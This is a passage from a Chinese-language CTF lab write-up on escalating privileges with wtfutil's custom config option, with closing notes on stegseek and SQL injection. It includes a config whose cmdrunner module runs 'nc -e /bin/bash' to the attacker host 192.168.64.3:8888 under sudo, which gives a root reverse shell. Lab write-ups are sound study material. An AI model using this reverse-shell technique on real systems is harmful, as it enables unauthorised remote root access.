/>这wp的帮助下，**发现-c可以修改配置文件，思路就是我们自己搞一个配置文件，然后执行即可**<br />![截屏2024-03-14 17.07.36.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710407293303-9561f45f-dd61-4152-8343-1b60c50f7f88.png#averageHue=%23070606&clientId=u8201bbc4-c50c-4&from=paste&height=500&id=uc5eabc12&originHeight=1000&originWidth=1790&originalType=binary&ratio=2&rotation=0&showTitle=false&size=237598&status=done&style=none&taskId=u5471e31d-985d-4293-afc6-1507a1521e4&title=&width=895)<br />![截屏2024-03-14 17.07.11.png](https://cdn.nlark.com/yuque/0/2024/png/40549096/1710407234840-73446fc6-f2da-4b9c-bf19-b6b71cef42f7.png#averageHue=%23050505&clientId=u8201bbc4-c50c-4&from=drop&height=701&id=u0bd7e1bd&originHeight=1328&originWidth=902&originalType=binary&ratio=2&rotation=0&showTitle=false&size=174257&status=done&style=none&taskId=u45462c6f-1737-4cb8-bc07-5981e06e289&title=&width=476)
```javascript
wtf:
  grid:
    columns: [20, 20]
    rows: [3, 3]
  refreshInterval: 1
  mods:
    uptime:
      type: cmdrunner
      args: ['-e','/bin/bash','192.168.64.3','8888'] // 参数
      cmd: "nc" // 命令
      enabled: true
      position:
        top: 0
        left: 0
        height: 1
        width: 1
      refreshInterval: 30
```
然后kali开启监听，靶机运行时-c=自己写的配置文件路径，sudo执行就能拿到一个反弹shell
<a name="xAL8Y"></a>
#### 抽象
解密，拿到一个新文件还是要**从它本身的功能寻**找提权思路，分析它文件，就像wtfutil可以自己配置文件，那我们就搞一个新的（语法可以参考自带的）<br />stegseek的使用，sql注入的发现，还有一些猜谜
